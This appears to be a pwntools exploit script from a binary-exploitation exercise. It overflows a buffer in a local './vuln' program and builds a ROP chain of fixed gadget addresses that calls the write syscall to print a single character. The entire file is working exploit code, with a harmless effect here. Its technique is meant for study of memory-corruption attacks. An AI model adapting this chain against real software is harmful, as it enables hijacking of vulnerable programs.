#!/usr/bin/python 
from pwn import *
from subprocess import call

def main():
	# 1094205761 found at offset: 112
	offset = 112
	payload = "A" * offset # Padding buffer with junk till offset

	# 0x08049453 : xor eax, eax ; ret
	xor_eax = p32(0x08049453)	
	
	# 0x0807a65f : inc eax ; ret
	inc_eax = p32(0x0807a65f)

	# 0x080d5e5d : inc ebx ; ret
	inc_ebx = p32(0x080d5e5d)

	# 0x0805cd67 : inc edx ; ret
	inc_edx = p32(0x0805cd67)
	
	# 0x0806c8f5 : int 0x80
	int_80 = p32(0x0806c8f5)

	# 0x080546ab : mov dword ptr [edx], eax ; ret
	mov_AddrEdx_Eax = p32(0x080546ab)
	
	# 0x0806ec7a : pop edx ; ret
	pop_edx = p32(0x0806ec7a)
	
	# 0x080b7fc6 : pop eax ; ret
	pop_eax = p32(0x080b7fc6)

	# 0x080de6b1 : pop ecx ; ret
	pop_ecx = p32(0x080de6b1)
	
	# 0x080481c9 : pop ebx ; ret
	pop_ebx = p32(0x080481c9)

	# 080ea060 l    d  .data  00000000 .data
	data_segment = p32(0x080ea060)
	data_segment_terminator = p32(0x080ea060 +1)
	
	# ROP: Write 
	# write: EAX: 4, EBX: 1(stdout), ECX: <"B\0">, EDX: 1	
	# ssize_t write(int fd, const void *buf, size_t count);
	rop_write = pop_edx # Stores data_segment in EDX
	rop_write += data_segment  # Address to write to
	rop_write += pop_eax # Stores BBBB in EAX
	rop_write += '\x42' * 4 # 'BBBB' 
	rop_write += mov_AddrEdx_Eax # Writes 'BBBB' to data_segment

	rop_write += xor_eax # Zero'es the EAX register
	rop_write += pop_edx # Stores data_segment_terminator in EDX
	rop_write += data_segment_terminator # Address to write to
	rop_write += mov_AddrEdx_Eax # Writes '0000' to data_segment_terminator

	# Sets EAX to 0x4 and EBX to 1
	rop_write += xor_eax 

	for i in range(1, 5): # Increment EAX 4 times
		rop_write += inc_eax

	rop_write += pop_ebx # Stores next value in EBX register
	rop_write += p32(0xffffffff)
	
	for i in range(1, 3): # Increment EBX 2 times
		rop_write += inc_ebx
		
	# Sets ECX to data_segement
	rop_write += pop_ecx # Stores the next value in ECX register
	rop_write += data_segment

	# Sets EDX to 1
	rop_write += pop_edx # Stores next value in EDX register	
	rop_write += p32(0xffffffff)

	for i in range(1, 3): # Increment EDX 2 times
		rop_write += inc_edx

	# Call interupt
	rop_write += int_80
	rop_write += p32(0xdeadbeef)
	
	# Crafts payload
	payload += rop_write

	# Executes exploit
	call(["./vuln", payload])


if __name__ == "__main__":
	main()
